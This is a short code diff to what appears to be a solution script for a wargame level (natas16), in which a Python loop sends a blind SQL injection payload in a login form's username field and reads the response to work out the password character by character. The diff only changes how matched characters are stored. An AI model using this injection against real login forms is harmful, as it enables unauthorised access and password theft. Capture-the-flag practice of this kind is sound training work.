@@ -30,9 +30,7 @@ for i in range(128):
     data = {"username": "natas16\" and password like BINARY '%{}%'-- ".format(char)} # BINARY keyword for case sensitive matching
     resp = sess.post(url, data=data, params={"debug":"true"}, headers=headers)
     if "This user exists." in resp.text:
-        characters.append(i)
-
-characters = [chr(i) for i in characters]
+        characters.append(char)
 
 print("Characters in the password", characters)
 
